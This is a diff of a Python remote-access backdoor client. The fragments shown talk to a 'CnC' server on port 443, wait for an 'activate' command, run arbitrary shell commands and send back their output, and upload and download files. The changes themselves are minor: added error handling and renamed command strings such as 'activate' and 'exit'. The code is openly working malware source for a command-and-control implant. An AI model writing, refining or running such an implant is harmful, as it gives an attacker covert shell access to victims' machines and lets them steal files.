@@ -11,10 +11,10 @@ PORT = 443
 active = False
 
 # send to CnC
-def Upload(sock, filename):
+def Upload(sock, file):
   try:
-    f = open(filename, 'rb')
-  except:
+    f = open(file, 'rb')
+  except IOError:
     pr('Error opening file.')
     return
 
@@ -28,7 +28,12 @@ def Upload(sock, filename):
 
 # receive from CnC
 def Download(sock, filename):
-  f = open(filename, 'wb')
+  try:
+    f = open(filename, 'wb')
+  except IOError:
+    pr('Error opening file.')
+    return
+
   d = Receive(sock)
   f.write(d)
   f.close()
@@ -101,7 +106,7 @@ while True:
     data = Receive(s)
 
     # activate.
-    if data == 'Activate':
+    if data == 'activate':
       active = True
       Send(s, "\n"+os.getcwd()+">")
 
@@ -115,8 +120,8 @@ while True:
         time.sleep(0.02)
 
       # check for quit
-      if data == "quit" or data == "terminate":
-        Send(s, "quitted")
+      if data == 'exit':
+        Send(s, 'exit ok')
         break
 
       # check for change directory
@@ -155,10 +160,6 @@ while True:
       stdoutput = stdoutput+"\n"+os.getcwd()+">"
       Send(s, stdoutput)
 
-    # loop ends here
-
-    if data == "terminate":
-      break
     time.sleep(3)
   except socket.error:
     s.close()
